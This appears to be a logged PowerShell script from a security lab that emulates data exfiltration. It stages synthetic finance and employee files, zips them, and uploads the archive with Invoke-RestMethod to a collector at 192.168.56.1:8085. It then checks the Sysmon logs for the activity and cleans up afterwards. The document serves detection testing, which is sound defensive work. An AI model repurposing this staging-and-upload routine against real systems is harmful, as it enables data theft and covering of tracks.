ScriptBlockText:
$ErrorActionPreference = 'Stop'
$start = Get-Date
$stage = 'C:\CyberLab\Phase3\synthetic-staging'
$archive = 'C:\CyberLab\Phase3\synthetic-exfil-bundle.zip'
New-Item -ItemType Directory -Path $stage -Force | Out-Null
@('record_id,amount','DEMO-001,100','DEMO-002,250') | Set-Content -LiteralPath (Join-Path $stage 'finance_demo.csv')
@('employee_id,department','SYN-001,Engineering','SYN-002,Research') | Set-Content -LiteralPath (Join-Path $stage 'employees_demo.csv')
'SYNTHETIC RESEARCH DATA - NO REAL OR PERSONAL INFORMATION' | Set-Content -LiteralPath (Join-Path $stage 'research_demo.txt')
Compress-Archive -Path (Join-Path $stage '*') -DestinationPath $archive -Force
$hash = (Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash.ToLowerInvariant()
$bytes = (Get-Item -LiteralPath $archive).Length
$response = Invoke-RestMethod -Uri 'http://192.168.56.1:8085/collect' -Method Post -InFile $archive -ContentType 'application/octet-stream'
Start-Sleep -Seconds 3
$network = foreach ($event in Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=3; StartTime=$start } -ErrorAction SilentlyContinue) {
  [xml]$xml = $event.ToXml(); $fields = @{}
  foreach ($item in $xml.Event.EventData.Data) { $fields[$item.Name] = [string]$item.'#text' }
  if ($fields.DestinationIp -eq '192.168.56.1' -and $fields.DestinationPort -eq '8085') {
    [ordered]@{ event_id=3; record_id=$event.RecordId; timestamp_utc=$event.TimeCreated.ToUniversalTime().ToString('o'); image=$fields.Image; user=$fields.User; destination_ip=$fields.DestinationIp; destination_port=$fields.DestinationPort; protocol=$fields.Protocol }
  }
}
$files = foreach ($event in Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=11; StartTime=$start } -ErrorAction SilentlyContinue) {
  [xml]$xml = $event.ToXml(); $fields = @{}
  foreach ($item in $xml.Event.EventData.Data) { $fields[$item.Name] = [string]$item.'#text' }
  if ($fields.TargetFilename -like '*\CyberLab\Phase3\*') {
    [ordered]@{ event_id=11; record_id=$event.RecordId; timestamp_utc=$event.TimeCreated.ToUniversalTime().ToString('o'); image=$fields.Image; user=$fields.User; target_filename=$fields.TargetFilename }
  }
}
Remove-Item -LiteralPath $archive -Force
Remove-Item -LiteralPath $stage -Recurse -Force
[ordered]@{
  scenario='synthetic archive staging and isolated transfer'
  source='WIN-LAB-01'
  destination='192.168.56.1:8085'
  filenames=@('finance_demo.csv','employees_demo.csv','research_demo.txt')
  bytes=$bytes
  sha256=$hash
  collector_bytes=[int]$response.bytes
  collector_sha256=[string]$response.sha256
  hash_match=($hash -eq [string]$response.sha256)
  cleanup_complete=(-not (Test-Path $stage)) -and (-not (Test-Path $archive))
  sysmon_network_events=@($network)
  sysmon_file_events=@($files)
} | ConvertTo-Json -Depth 7
